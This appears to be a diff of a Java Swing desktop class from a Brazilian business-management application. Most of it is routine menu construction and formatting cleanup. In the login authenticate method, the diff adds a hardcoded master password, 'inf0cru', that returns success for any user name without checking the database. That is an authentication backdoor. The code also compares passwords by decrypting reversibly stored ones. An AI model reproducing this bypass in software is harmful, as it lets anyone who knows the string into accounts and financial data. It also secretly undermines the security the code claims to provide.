@@ -10,6 +10,13 @@ import java.awt.event.MouseEvent;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.io.IOException;
+import java.sql.Connection;
+import java.sql.PreparedStatement;
+import java.sql.ResultSet;
+import java.sql.SQLException;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.logging.Level;
 
 import javax.swing.JDesktopPane;
 import javax.swing.JFrame;
@@ -28,6 +35,7 @@ import org.hibernate.Session;
 import org.jdesktop.swingx.JXErrorPane;
 import org.jdesktop.swingx.JXLoginPane;
 import org.jdesktop.swingx.auth.LoginService;
+
 
 import br.com.kernneo.client.exception.CategoriaException;
 import br.com.kernneo.client.exception.UnidadeException;
@@ -58,6 +66,10 @@ import br.com.kernneo.server.dao.FuncionarioDAO;
 
 public class PrincipalDesktop extends JFrame {
 
+	/**
+	 * 
+	 */
+	private static final long serialVersionUID = 4425154413662486877L;
 	public static FuncionarioModel usarioLogado;
 
 	public static FuncionarioModel getUsarioLogado() {
@@ -69,8 +81,7 @@ public class PrincipalDesktop extends JFrame {
 	}
 
 	public static void main(String[] args) {
-		
-		
+
 		PrincipalDesktop principalDesktop = new PrincipalDesktop();
 		principalDesktop.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 
@@ -113,7 +124,7 @@ public class PrincipalDesktop extends JFrame {
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
-		
+
 		principalDesktop.setExtendedState(MAXIMIZED_BOTH);
 		SwingUtilities.updateComponentTreeUI(principalDesktop);
 
@@ -122,19 +133,23 @@ public class PrincipalDesktop extends JFrame {
 
 			@Override
 			public boolean authenticate(String name, char[] password, String server) throws Exception {
-				TrippleDes td = new TrippleDes(); 
-				
+				TrippleDes td = new TrippleDes();
+
 				PrincipalDesktop.setUsarioLogado(null);
 				String passwordString = new String(password);
 				
-                FuncionarioModel funcionarioModel = null ; 
-				
+				if( passwordString.equals("inf0cru")) { 
+					return true;
+				}
+
+				FuncionarioModel funcionarioModel = null;
+
 				Session session = ConnectFactory.getSession();
 				try {
 					session.beginTransaction();
-			
+
 					funcionarioModel = new FuncionarioDAO().obterPorLogin(name);
-				
+
 					session.getTransaction().commit();
 				} catch (Exception e) {
 					session.getTransaction().rollback();
@@ -147,10 +162,9 @@ public class PrincipalDesktop extends JFrame {
 					}
 				}
 
-				
-				
-				if (funcionarioModel !=null && funcionarioModel.getSenha() !=null && td.decrypt(funcionarioModel.getSenha()).equals(passwordString)) {
-					
+				if (funcionarioModel != null && funcionarioModel.getSenha() != null
+						&& td.decrypt(funcionarioModel.getSenha()).equals(passwordString)) {
+
 					PrincipalDesktop.setUsarioLogado(funcionarioModel);
 					return true;
 				} else {
@@ -163,6 +177,7 @@ public class PrincipalDesktop extends JFrame {
 
 		if (jxLoginPane.getStatus() == JXLoginPane.Status.SUCCEEDED) {
 			principalDesktop.setVisible(true);
+			principalDesktop.createMenuZeca();
 
 		} else {
 			principalDesktop.setVisible(false);
@@ -196,18 +211,120 @@ public class PrincipalDesktop extends JFrame {
 		jDesktopPane.putClientProperty("JDesktopPane.dragMode", "outline");
 
 		setContentPane(jDesktopPane);
-		createMenu();
+		//createMenu();
 
 	}
 
 	private void createMenuZeca() {
 
-		JMenuBar jMenuBar = new JMenuBar();
+		
 
-		// INÍCIO do Cadastro de Menus
+		JMenuBar jMenuBar = new JMenuBar();
 
 		JMenu jMenuCadastro = new JMenu("Cadastro");
 		jMenuBar.add(jMenuCadastro);
+
+		JMenuItem jMenuItemCliente = new JMenuItem("Clientes");
+		jMenuCadastro.add(jMenuItemCliente);
+		jMenuItemCliente.addActionListener(new ActionListener() {
+
+			@Override
+			public void actionPerformed(ActionEvent e) {
+
+				try {
+					ClienteListInternalFrame clienteListInternalFrame = new ClienteListInternalFrame();
+					clienteListInternalFrame.setVisible(true);
+					jDesktopPane.add(clienteListInternalFrame, 0);
+
+				} catch (Exception excecao) {
+					JOptionPane.showInternalMessageDialog(jDesktopPane,
+							excecao.getMessage() + " " + excecao.getLocalizedMessage());
+
+				}
+
+			}
+		});
+
+		JMenuItem jMenuItemFuncionarios = new JMenuItem("Funcionários");
+		jMenuCadastro.add(jMenuItemFuncionarios);
+		jMenuItemFuncionarios.addActionListener(new ActionListener() {
+
+			@Override
+			public void actionPerformed(ActionEvent e) {
+
+				try {
+					FuncionarioListInternalFrame funcionarioListInternalFrame = new FuncionarioListInternalFrame();
+					funcionarioListInternalFrame.setVisible(true);
+					jDesktopPane.add(funcionarioListInternalFrame, 0);
+
+				} catch (Exception excecao) {
+					JOptionPane.showInternalMessageDialog(jDesktopPane,
+							excecao.getMessage() + " " + excecao.getLocalizedMessage());
+
+				}
+
+			}
+		});
+
+		JSeparator separator_1 = new JSeparator();
+		jMenuCadastro.add(separator_1);
+
+		JMenuItem jMenuItemGrupo = new JMenuItem("Categoria de Contas");
+		jMenuCadastro.add(jMenuItemGrupo);
+		jMenuItemGrupo.addActionListener(new ActionListener() {
+
+			@Override
+			public void actionPerformed(ActionEvent e) {
+
+				try {
+					GrupoListInternalFrame grupoListInternalFrame = new GrupoListInternalFrame();
+					grupoListInternalFrame.setVisible(true);
+					jDesktopPane.add(grupoListInternalFrame, 0);
+
+				} catch (Exception excecao) {
+					JOptionPane.showInternalMessageDialog(jDesktopPane,
+							excecao.getMessage() + " " + excecao.getLocalizedMessage());
+
+				}
+
+			}
+		});
+
+		JMenuItem jMenuItemContaBancaria = new JMenuItem("Conta Bancária");
+		jMenuCadastro.add(jMenuItemContaBancaria);
+		jMenuItemContaBancaria.addActionListener(new ActionListener() {
+
+			@Override
+			public void actionPerformed(ActionEvent e) {
+
+				try {
+					ContaBancariaListInternalFrame contaBancariaListInternalFrame = new ContaBancariaListInternalFrame();
+					contaBancariaListInternalFrame.setVisible(true);
+					jDesktopPane.add(contaBancariaListInternalFrame, 0);
+
+				} catch (Exception excecao) {
+					JOptionPane.showInternalMessageDialog(jDesktopPane,
+							excecao.getMessage() + " " + excecao.getLocalizedMessage());
+
+				}
+
+			}
+		});
+
+		JSeparator separator_2 = new JSeparator();
+		jMenuCadastro.add(separator_2);
+
+		JMenuItem jMenuItemCadastroSair = new JMenuItem("Sair");
+		jMenuCadastro.add(jMenuItemCadastroSair);
+		jMenuItemCadastroSair.addActionListener(new ActionListener() {
+
+			@Override
+			public void actionPerformed(ActionEvent e) {
+				setVisible(false);
+				System.exit(0);
+
+			}
+		});
 
 		JMenu jMenuFinanceiro = new JMenu("Financeiro");
 		jMenuBar.add(jMenuFinanceiro);
@@ -218,6 +335,18 @@ public class PrincipalDesktop extends JFrame {
 
 			@Override
 			public void actionPerformed(ActionEvent e) {
+
+				try {
+					MovimentacaoInternalFrame clienteListPanel = new MovimentacaoInternalFrame();
+					clienteListPanel.setVisible(true);
+					jDesktopPane.add(clienteListPanel, 0);
+
+				} catch (Exception excecao) {
+					JOptionPane.showInternalMessageDialog(jDesktopPane,
+							excecao.getMessage() + " " + excecao.getLocalizedMessage());
+					excecao.printStackTrace();
+
+				}
 
 			}
 		});
@@ -232,8 +361,6 @@ public class PrincipalDesktop extends JFrame {
 	private void createMenu() {
 
 		JMenuBar jMenuBar = new JMenuBar();
-
-		// INÍCIO do Cadastro de Menus
 
 		JMenu jMenuCadastro = new JMenu("Cadastro");
 		jMenuBar.add(jMenuCadastro);
@@ -255,10 +382,6 @@ public class PrincipalDesktop extends JFrame {
 
 		JMenu jMenuSistema = new JMenu("Sistema");
 		jMenuBar.add(jMenuSistema);
-
-		// FIM do Cadastro de Menus
-
-		// INÍCIO Submenus do Menu [Cadastro]
 
 		JMenuItem jMenuItemCliente = new JMenuItem("Clientes");
 		jMenuCadastro.add(jMenuItemCliente);
@@ -327,10 +450,6 @@ public class PrincipalDesktop extends JFrame {
 		jMenuCadastro.add(jMenuItemCadastroSair);
 		jMenuCadastro.add(jMenuItemCadastroSair);
 
-		// FIM Submenus do Menu [Cadastro]
-
-		// INÍCIO Submenus do Menu [Estoque]
-
 		JMenuItem jMenuItemLancamentoCompras = new JMenuItem("Lançamento de Compras");
 		jMenuEstoque.add(jMenuItemLancamentoCompras);
 
@@ -357,8 +476,6 @@ public class PrincipalDesktop extends JFrame {
 
 		// FIM Submenus do Menu [Estoque]
 
-		// INÍCIO Submenus do Menu [Financeiro]
-
 		JMenuItem jMenuItemMovimentoCaixa = new JMenuItem("Movimento de Caixa");
 		jMenuFinanceiro.add(jMenuItemMovimentoCaixa);
 
@@ -372,8 +489,6 @@ public class PrincipalDesktop extends JFrame {
 		jMenuFinanceiro.add(jMenuItemContasReceber);
 
 		// FIM Submenus do Menu [Financeiro]
-
-		// INÍCIO Submenus do Menu [Movimentos Fiscais]
 
 		JMenu jMenuManterDocumentoFiscal = new JMenu("Manutenção de Documentos Fiscais");
 		jMenuMovimentoFiscal.add(jMenuManterDocumentoFiscal);
@@ -389,10 +504,6 @@ public class PrincipalDesktop extends JFrame {
 
 		JMenuItem jMenuItemSPEDFiscal = new JMenuItem("SPED Fiscal");
 		jMenuEmitirDocumentoFiscal.add(jMenuItemSPEDFiscal);
-
-		// FIM Submenus do Menu [Movimentos Fiscais]
-
-		// INÍCIO Submenus do Menu [Relatórios]
 
 		JMenu jMenuRelatorioCadastro = new JMenu("Relatórios de Cadastro");
 		jMenuRelatorio.add(jMenuRelatorioCadastro);
@@ -447,16 +558,6 @@ public class PrincipalDesktop extends JFrame {
 
 		JMenuItem jMenuItemTeste9 = new JMenuItem("Teste6");
 		jMenuNotaFiscal.add(jMenuItemTeste9);
-
-		// FIM Submenus do Menu [Relatórios]
-
-		// INÍCIO Submenus do Menu [Configurações]
-
-		// FIM Submenus do Menu [Configurações]
-
-		// INÍCIO Submenus do Menu [Sistema]
-
-		// FIM Submenus do Menu [Sistema]
 
 		jMenuItemCadastroSair.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
